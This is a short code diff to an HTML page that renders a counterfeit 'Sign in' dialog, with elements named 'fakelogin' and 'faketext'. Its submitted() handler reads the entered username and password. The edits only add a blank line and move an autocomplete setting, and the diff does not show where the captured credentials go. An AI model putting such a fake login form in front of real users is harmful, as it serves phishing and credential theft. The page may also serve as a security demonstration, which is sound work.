@@ -16,6 +16,7 @@
 					}
 				});
 			}
+			
 			function submitted(elem) {
 				var user = document.getElementById("username").value;
 				var pass = document.getElementById("password").value
@@ -136,17 +137,17 @@
 	</head>
 	<body onload="setup();">
 		<div id="fakewrapper">
-			<form id="fakelogin" onsubmit="return submitted(this);">
+			<form id="fakelogin" onsubmit="return submitted(this);" autocomplete="off">
 				<p id="title">Sign in</p>
 				<p id="url"></p>
 				<table>
 					<tr>
 						<td align="left">Username</td>
-						<td align="left" class="fakebig"><input type="text" autofocus class="faketext" id="username" autocomplete="off"></td>
+						<td align="left" class="fakebig"><input type="text" autofocus class="faketext" id="username"></td>
 					</tr>
 					<tr>
 						<td align="left">Password</td>
-						<td align="left" class="fakebig"><input type="password" class="faketext" id="password" autocomplete="off"></td>
+						<td align="left" class="fakebig"><input type="password" class="faketext" id="password"></td>
 					</tr>
 				</table>
 				<div id="buttons">
